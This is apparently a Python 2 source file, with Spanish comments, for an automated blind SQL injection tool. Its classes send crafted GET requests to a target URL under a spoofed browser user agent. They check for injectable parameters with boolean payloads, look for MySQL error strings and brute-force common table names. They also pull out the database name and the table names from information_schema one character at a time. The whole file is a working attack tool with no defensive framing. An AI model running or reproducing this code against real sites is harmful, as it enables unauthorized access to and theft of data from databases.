# -*- coding: utf-8 -*-


import urllib2,sys,re

class sitex:
    def __init__(self, sitio,bbdd,table):
        self.url = sitio
        self.bbddEncontradas = bbdd
        self.TablasEncontradas = []
        self.RegEncontradas = []
        #Me conecto al sitio y genero el handler
        req = urllib2.Request(self.url)
        req.add_header('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2')
        self.urlConnect = urllib2.urlopen(req)
        self.htmlBien = ""
        self.htmlMal =""









class injection:

    def __init__(self):
        self.injTable = "\'+and+ascii(substring((select+table_name+from+information_schema.tables+where+table_schema='"+self.bbddEncontradas+"'+limit+¿,1),"
        self.injDataBase = "\'+and+ascii(substring((database()),"

    def comp_fuente(self,html):
        html2 = self.connect("\'/**/and/**/1=0/**/--\'")
        if(len(html) != len(html2)):
            return True
        else:
            return False


    def bus_patron(self,html):
        list_true = []
        error_mysql = ["mysql_fetch_array()","Invalid query:","You have an error in your SQL syntax;"]
        for err in error_mysql:
            list_true += re.findall(err,html)
            if len(list_true) > 0:
                return True
            elif len(list_true) == 0:
                return False

    def injBlindBBDD(self):
        self.inj = []
        for c in range(0,len(self.charAscii)):
            self.inj.append(self.injDataBase+"?,2))="+str(self.charAscii[c])+"+--\'")

    def injBlind(self):
        self.inj = []
        for c in range(0,len(self.charAscii)):
            self.inj.append(self.injTable+"?,2))="+str(self.charAscii[c])+"+--\'")

    def injBrute(self):
        for c in range(0,len(self.tableList)):
            self.inj.append("\'/**/aND/**/(SeLeCt/**/CoUnT(*)/**/FroM/**/"+self.tableList[c]+")/**/--\'")

    def comprobar(self,html,method):
        if(method == 'Busca Patron'):
            if (self.bus_patron(html)):
                return False
                #self.TablasEncontradas.append("\n[-] No se encontro tablas")
            else:
                return True
                #self.TablasEncontradas.append("\n[+]Tabla encontrada ...")
        elif(method == 'Compara fuentes'):
            if(self.comp_fuente(html)):
                return True
            else:
                return False










class atack(sitex,injection):

    def __init__(self,sitio,bbdd,table):
        sitex.__init__(self,sitio,bbdd,table)
        injection.__init__(self)
        self.inj = []
        self.methodAtack = "GET"
        self.tableList = ["usuarios","noticia","wordpress","joomla"]
        self.charAscii = [44,0,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90]

    def method(self,method):
        self.methodAtack = method
        return method

    def connect(self,inj):
        req = urllib2.Request(self.url+inj)
        req.add_header('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2')
        self.urlConnect = urllib2.urlopen(req)
        return self.urlConnect.read()

    def imprimir(self):
        partH = self.url.split("?")
        host = partH[0]
        var = partH[-1]
        info = self.urlConnect.info()
        return ("[?]Host: %s\n[?]Var: %s\n[?]Info:\n%s\nendinfo;" % (host,var,info))

    def vulnerable(self):
        self.htmlBien = self.connect('\'/**/AND/**/1=1--\'')
        self.htmlMal = self.connect('\'/**/AND/**/1=0--\'')
        if( len(self.htmlBien) != len(self.htmlMal)):
            return "\n[+]Es vulnerable"
        else:
            return "\n[+]No es vulnerable"

    def run(self,methodError):
        for s in range(0,len(self.inj)):
            print self.inj[s]
            html = self.connect(self.inj[s])
            if(self.comprobar(html,methodError)):
                self.TablasEncontradas.append("\n[+]"+self.tableList[s])
        return "\n".join(self.TablasEncontradas)

    def runBlindBBDD(self,methodError):
        x = 0
        name = []
        endLista = True
        while(endLista):
            endLista = False
            x+=1
            for s in range(0,len(self.inj)):
                injF = self.inj[s].split("?")
                injT = str(x).join(injF)
                print injT
                html = self.connect(injT)
                if(self.comprobar(html,methodError)):
                    if chr(self.charAscii[s]) == '\x00':
                        endLista = False
                        break
                    name.append(chr(self.charAscii[s]))
                    endLista = True
                    break
        return "".join(name)


    def runBlind(self,methodError):
        endTabla = True
        j = 0
        while(endTabla):
            endTabla = True
            endLista = True
            name = []
            x = 0
            print "siguiente tabla"
            while(endLista):
                #En busca del name de la tabla
                print "buscando el name de la tabla"
                endLista = False
                x +=1
                print "x:"+str(x)
                for s in range(0,len(self.inj)):
                    #El ciclo que busca el caracter
                    injF = self.inj[s].split("¿")
                    injT = str(j).join(injF)
                    injF = injT.split("?")
                    injT = str(x).join(injF)
                    print injT
                    html = self.connect(injT)
                    if(self.comprobar(html,methodError)):
                        if chr(self.charAscii[s]) == '\x00':
                            #si fin del nombre de la tabla sale del for
                            # y sale del while para buscar la siguiente
                            #tabla.
                            endLista = False
                            break
                        name.append(chr(self.charAscii[s]))
                        endLista = True
                        break

                if("".join(name) == ""):
                    print "uno dentro"
                    endLista = False
                    endTabla = False
                    continue

            #Agrego el nombre de la tabla encontrada
            self.TablasEncontradas.append("".join(name))
            #corro uno el limit+j,1
            j += 1
        return self.TablasEncontradas
